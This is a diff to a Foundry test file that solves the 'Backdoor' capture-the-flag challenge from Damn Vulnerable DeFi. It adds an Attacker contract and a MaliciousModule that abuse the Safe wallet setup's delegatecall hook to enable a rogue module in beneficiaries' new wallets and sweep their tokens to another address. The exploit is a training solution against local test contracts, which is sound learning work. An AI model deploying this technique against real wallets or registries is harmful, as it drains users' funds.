@@ -8,11 +8,19 @@ import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxie
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
+import {IERC20} from "forge-std/interfaces/IERC20.sol";
+import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
+
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];
+    address[] users = [
+        makeAddr("alice"),
+        makeAddr("bob"),
+        makeAddr("charlie"),
+        makeAddr("david")
+    ];
 
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
 
@@ -41,7 +49,12 @@ contract BackdoorChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy the registry
-        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
+        walletRegistry = new WalletRegistry(
+            address(singletonCopy),
+            address(walletFactory),
+            address(token),
+            users
+        );
 
         // Transfer tokens to be distributed to the registry
         token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
@@ -54,7 +67,10 @@ contract BackdoorChallenge is Test {
      */
     function test_assertInitialState() public {
         assertEq(walletRegistry.owner(), deployer);
-        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
+        assertEq(
+            token.balanceOf(address(walletRegistry)),
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
         for (uint256 i = 0; i < users.length; i++) {
             // Users are registered as beneficiaries
             assertTrue(walletRegistry.beneficiaries(users[i]));
@@ -70,7 +86,15 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // Deploy attacker
+        Attacker attacker = new Attacker(
+            walletFactory,
+            singletonCopy,
+            walletRegistry,
+            users,
+            token,
+            recovery
+        );
     }
 
     /**
@@ -93,4 +117,97 @@ contract BackdoorChallenge is Test {
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
     }
+}
+
+contract Attacker {
+    constructor(
+        SafeProxyFactory walletFactory,
+        Safe singletonCopy,
+        WalletRegistry walletRegistry,
+        address[] memory users,
+        DamnValuableToken token,
+        address recovery
+    ) public {
+        // Deploy malicious module, this module will be enabled in all safes and will allow to initialize sweepERC20 transactions in all of them.
+        MaliciousModule maliciousModule = new MaliciousModule();
+
+        // Malicious Module initialization callback, this callback will be used to enable the malicious module through a delegatecall to MaliciousModule.enableModule when setting up the Safe.
+        bytes memory moduleInitializer = abi.encodeCall(
+            MaliciousModule.enableModule,
+            (address(maliciousModule))
+        );
+
+        // For each user in the list
+        uint256 usersLength = users.length;
+        for (uint256 i = 0; i < usersLength; i++) {
+            // Create and initialize a new Safe for the user
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1,
+                    address(maliciousModule), // This specify that the maliciousModule will be called to initialize the Safe
+                    moduleInitializer, // This specify a delegatecall to MaliciousModule.enableModule
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+            Safe wallet = Safe(
+                payable(
+                    address(
+                        walletFactory.createProxyWithCallback(
+                            address(singletonCopy),
+                            initializer,
+                            uint256(uint160(users[i])),
+                            walletRegistry
+                        )
+                    )
+                )
+            );
+
+            // Drain tokens from the wallet by using the malicious module as a backdoor.
+            maliciousModule.startSweepERC20(wallet, address(token), recovery);
+        }
+    }
+}
+
+contract MaliciousModule {
+    address singleton = address(0x0);
+    mapping(address => address) modules;
+    address internal constant SENTINEL_MODULES = address(0x1);
+
+    // Delegatecall during Safe setup to enable the malicious module
+    function enableModule(address module) external {
+        modules[module] = modules[SENTINEL_MODULES];
+        modules[SENTINEL_MODULES] = module;
+    }
+
+    // Delegatecall to sweep ERC20 tokens
+    function sweepERC20(address token, address to) external {
+        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
+    }
+
+    // Call to initialize the ERC20 draining transaction
+    function startSweepERC20(
+        Safe wallet,
+        address token,
+        address recovery
+    ) external {
+        bytes memory sweepERC20Call = abi.encodeCall(
+            MaliciousModule.sweepERC20,
+            (token, recovery)
+        );
+        wallet.execTransactionFromModule(
+            address(this),
+            0,
+            sweepERC20Call,
+            Enum.Operation.DelegateCall
+        );
+    }
+
+
 }
